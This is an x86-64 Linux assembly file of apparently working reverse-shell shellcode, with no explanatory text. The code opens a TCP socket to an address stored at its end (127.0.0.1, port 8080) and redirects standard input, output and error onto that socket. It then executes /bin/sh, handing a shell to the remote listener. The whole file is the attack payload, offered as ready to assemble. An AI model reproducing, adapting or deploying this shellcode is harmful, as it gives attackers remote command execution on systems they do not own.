[SECTION .text]
	global _start
_start:
	jmp short ender

	starter:
	push 41
	pop rax
	push 2
	pop rdi
	push 1
	pop rsi
	push 6
	pop rdx
	syscall

	; auto save socket fd

	push rax
	pop rbp

	push rax
	pop rdi
	push 42
	pop rax
	pop rbx
	push rbx
	pop rsi
	push 16
	pop rdx
	syscall

	;dup2(3, 0)

	push rbp
	pop rdi
    xor rsi, rsi
	push 33
	pop rax
	syscall

	; dup2(3, 1)

	push rbp
	pop rdi
	push 1
	pop rsi
	push 33
	pop rax
	syscall

	; dup2(3, 2)

	 push rbp
	 pop rdi
	 push 2
	 pop rsi
	 push 33
	 pop rax
	 syscall

	; shell

	 mov rdi, 0x68732f6e69622f6a
	 shr rdi, 8
	 push rdi
	 push rsp
	 pop rdi
 	 push 59
 	 pop rax
 	 xor rsi, rsi
 	 xor rdx, rdx
 	 syscall

	ender:
	    call starter
	    db 2,0,31,144,127,0,0,1,0,0,0,0,0,0,0,0
